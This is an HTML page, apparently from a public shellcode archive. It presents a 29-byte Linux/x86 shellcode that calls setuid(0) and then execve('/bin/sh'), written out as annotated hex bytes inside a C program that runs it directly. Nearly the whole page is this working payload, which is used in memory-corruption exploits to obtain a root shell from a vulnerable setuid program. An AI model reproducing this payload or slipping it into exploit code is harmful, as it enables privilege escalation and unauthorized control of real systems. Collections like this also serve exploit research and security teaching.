<html><head><title>Linux/x86 - setuid(0) + execve(/bin/sh,...) - 29 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 29 byte-long setuid(0) + execve(&quot;/bin/sh&quot;,...) shellcode
   by Marcin Ulikowski &lt;elceef@itsec.pl&gt; */
 
#include &lt;unistd.h&gt;
 
char shellcode[] =
&quot;\x31\xdb&quot;             /* xor    %ebx,%ebx       */
&quot;\x8d\x43\x17&quot;         /* lea    0x17(%ebx),%eax */
&quot;\xcd\x80&quot;             /* int    $0x80           */
&quot;\x53&quot;                 /* push   %ebx            */
&quot;\x68\x6e\x2f\x73\x68&quot; /* push   $0x68732f6e     */
&quot;\x68\x2f\x2f\x62\x69&quot; /* push   $0x69622f2f     */
&quot;\x89\xe3&quot;             /* mov    %esp,%ebx       */
&quot;\x50&quot;                 /* push   %eax            */
&quot;\x53&quot;                 /* push   %ebx            */
&quot;\x89\xe1&quot;             /* mov    %esp,%ecx       */
&quot;\x99&quot;                 /* cltd                   */
&quot;\xb0\x0b&quot;             /* mov    $0xb,%al        */
&quot;\xcd\x80&quot;;            /* int    $0x80           */
 
int main(void) {
  void(*f)()=(void*)shellcode;f();
  return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
